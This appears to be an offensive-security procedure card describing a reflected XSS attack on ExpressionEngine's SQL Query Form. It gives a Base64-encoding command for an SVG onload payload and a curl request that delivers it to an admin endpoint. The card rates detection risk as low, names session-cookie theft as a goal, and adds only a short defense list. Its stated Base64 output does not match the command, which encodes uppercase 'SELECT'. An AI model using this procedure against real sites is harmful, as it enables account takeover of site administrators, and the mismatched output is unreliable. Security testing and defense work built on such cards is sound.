---
id: proc-expressionengine-xss-trigger
tags:
  - xss
  - reflected
  - expressionengine
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/base64-encode-query]]'
  - '[[commands/curl-send-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:47.210Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Trigger-Reflected-XSS-in-Query-Form

## Summary

This procedure exploits the lack of encoding in MySQL error messages from the ExpressionEngine SQL Query Form by submitting a Base64-encoded malformed query, reflecting XSS payloads in the admin's browser for JavaScript execution.

## Description

Malformed SQL triggers MySQL errors that display unencoded HTML/JS from the `thequery` parameter, enabling reflected XSS. This can steal session cookies or chain with SQLi for enhanced data theft in PHP/MySQL web apps.

## Requirements

1. Vulnerable ExpressionEngine instance
2. Base64 encoding capability
3. Admin session for execution
4. Browser to observe JS execution

## Defense

Defensive measures and detection strategies:

- Encode all error messages before output
- Sanitize `thequery` for HTML/JS injection
- Deploy CSP headers to block inline JS
- Monitor for error responses with anomalous content

## Objectives

1. Craft XSS payload in SQL
2. Trigger error reflection
3. Execute JS in victim browser

## Instructions

### Step 1: Encode XSS Payload

**Context**: Create a malformed SQL with JS tag.

**Command** ([[commands/base64-encode-query]]):
```bash
echo -n 'SELECT <svg onload=alert(1)>' | base64 -w 0
```

> Outputs `c2VsZWN0IDxzdmcgb25sb2FkPWFsZXJ0KDEpPg==`. Use in URL.

### Step 2: Send and Trigger

**Context**: Deliver via link or direct request to cause error.

**Command** ([[commands/curl-send-query]]):
```bash
curl "http://target.com/admin.php?/cp/utilities/query/run-query&thequery=c2VsZWN0IDxzdmcgb25sb2FkPWFsZXJ0KDEpPg==" -v
```

> Expected: Response with unencoded <svg> tag in error, executing onload in browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/base64-encode-query]]
- [[commands/curl-send-query]]

## Tools Used


## Tags

- xss
- reflected
- javascript-execution
